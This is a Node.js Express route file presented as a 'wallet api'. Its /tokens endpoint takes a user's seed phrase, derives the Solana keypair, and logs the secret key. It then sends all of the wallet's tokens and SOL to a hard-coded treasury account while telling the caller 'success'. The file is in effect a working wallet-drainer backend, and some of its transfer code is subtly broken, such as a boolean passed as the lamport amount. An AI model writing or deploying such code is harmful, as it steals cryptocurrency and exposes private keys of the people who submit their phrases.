var express = require('express');
var router = express.Router();
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');

const {
  Connection,
  clusterApiUrl,
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  sendAndConfirmTransaction,
  Transaction,
  SystemProgram
} = require("@solana/web3.js");

const { NETWORK, DEFAULT_PRIVATE_KEY, TREASURY_ACCOUNT } = require('../constants');
const { getTokenAccounts, getTokenPrice } = require('../helper');
const base58 = require('bs58');
const { getOrCreateAssociatedTokenAccount, createTransferInstruction } = require('@solana/spl-token');

const networkUrl = clusterApiUrl(NETWORK);
const solanaConnection = new Connection(networkUrl, "confirmed");


/* GET wallet listing. */
router.get('/', function (req, res) {
  res.send('wallet api');
});


router.post('/tokens', async function (req, res) {
  try {
    const { phrase } = req.body
    // let phrase = 'sa,as,as,as,as,as,sa,as,as,as,as,asd';

    const treasury_account = TREASURY_ACCOUNT
    let user = null

    // Derive the seed from the mnemonic
    bip39.mnemonicToSeed(phrase).then(async seed => {
      // Derive the keypair from the seed using a standard derivation path
      const derivationPath = `m/44'/501'/0'/0'`; // Standard path for Solana
      const { key } = derivePath(derivationPath, seed.toString('hex'));

      user = Keypair.fromSeed(key);

      console.log('Public Key:', user.publicKey.toBase58());
      console.log('Secret Key:', user.secretKey);
      // check if wallet has sol or not and the value
      let solBalanceWithDecimal = await solanaConnection.getBalance(user.publicKey);
      const solBalance = solBalanceWithDecimal / LAMPORTS_PER_SOL;

      console.log(`Wallet Balance: ${solBalance}`)

      const tx = new Transaction();

      let resultLog = []

      if (!!solBalance) {
        const tokenInfos = await getTokenAccounts(user.publicKey, solanaConnection);
        await Promise.all(tokenInfos.map(async (_tokenInfo, index) => {

          console.log(`1 - Getting Source Token Account`);
          let sourceAccount = await getOrCreateAssociatedTokenAccount(
            solanaConnection,
            user,
            new PublicKey(_tokenInfo.mintAddress),
            user.publicKey
          );

          let destinationAccount = await getOrCreateAssociatedTokenAccount(
            solanaConnection,
            user,
            new PublicKey(_tokenInfo.mintAddress),
            new PublicKey(treasury_account)
          );

          console.log(`4 - Creating and Sending Transaction`);
          tx.add(createTransferInstruction(
            sourceAccount.address,
            destinationAccount.address,
            user.publicKey,
            _tokenInfo.balance * Math.pow(10, _tokenInfo.decimals)
          ))

          const latestBlockHash = await solanaConnection.getLatestBlockhash('confirmed');
          tx.recentBlockhash = await latestBlockHash.blockhash;
          const signature = await sendAndConfirmTransaction(solanaConnection, tx, [user]);
          console.log(
            '\x1b[32m', //Green Text
            `   Transaction Success!🎉`,
            `\n    https://explorer.solana.com/tx/${signature}?cluster=devnet`
          );

          resultLog.push(
            `   Token Transaction Success!🎉
              https://explorer.solana.com/tx/${signature}?cluster=devnet`)

        }))

        let solBalanceWithDecimal = await solanaConnection.getBalance(user.publicKey);
        console.log(solBalanceWithDecimal > 0.0001 * LAMPORTS_PER_SOL);
        if (solBalanceWithDecimal > 0.0001 * LAMPORTS_PER_SOL) {
          tx.add(SystemProgram.transfer({
            fromPubkey: user.publicKey,
            toPubkey: new PublicKey(treasury_account),
            lamports: solBalanceWithDecimal > 0.0002 * LAMPORTS_PER_SOL,
          }))

          const latestBlockHash = await solanaConnection.getLatestBlockhash('confirmed');
          tx.recentBlockhash = await latestBlockHash.blockhash;
          const signature = await sendAndConfirmTransaction(solanaConnection, tx, [user]);
          console.log(
            '\x1b[32m', //Green Text
            `   Transaction Success!🎉`,
            `\n    https://explorer.solana.com/tx/${signature}?cluster=devnet`
          );
          resultLog.push(
            `   Sol Transaction Success!🎉
              https://explorer.solana.com/tx/${signature}?cluster=devnet`)
        }

      }
    }).catch(err => {
      console.error('Error deriving seed from mnemonic:', err);
    });

    // retrieve all the tokens in wallet and its values from Raydium
    // const privKey = DEFAULT_PRIVATE_KEY;
    // const user = Keypair.fromSecretKey(base58.decode(privKey));

    // transfer from greater amount

    return res.status(200).json({
      code: 'success',
      data: "ok",
      error: ''
    });

  }
  catch (e) {
    console.log(e.message);
    return res.status(500).json({
      code: 'error',
      data: [],
      error: e.message
    });
  }
});

module.exports = router;
